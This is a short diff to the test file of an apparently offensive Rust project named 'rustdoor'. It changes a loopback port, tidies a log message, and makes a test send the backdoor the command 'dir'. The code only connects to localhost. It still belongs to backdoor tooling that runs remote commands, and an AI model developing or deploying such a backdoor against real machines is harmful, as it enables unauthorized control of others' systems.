@@ -7,12 +7,12 @@ use rustdoor::communication::messages::RunCommandRequest;
 use rustdoor::communication::serialization::serialize_message;
 
 const LOOPBACK_IP: &str = "127.0.0.1";
-const PORT: u32 = 1337;
+const PORT: u32 = 13337;
 
 pub fn connect_to_backdoor(addr: &str) -> Result<TcpStream, Error> {
     match TcpStream::connect(addr) {
         Ok(stream) => {
-            println!("Successfully connected to backdoor in port 1337");
+            println!("Successfully connected to backdoor in port {}", PORT);
             Ok(stream)
         }
         Err(e) => {
@@ -45,7 +45,7 @@ fn test_basic_connection() {
 fn test_send_basic_command() {
     let mut stream = run_server_and_connect().unwrap();
     let message = RunCommandRequest {
-        command: String::from(""),
+        command: String::from("dir"),
         async_run: false,
     };
     let buffer = serialize_message(message).unwrap();
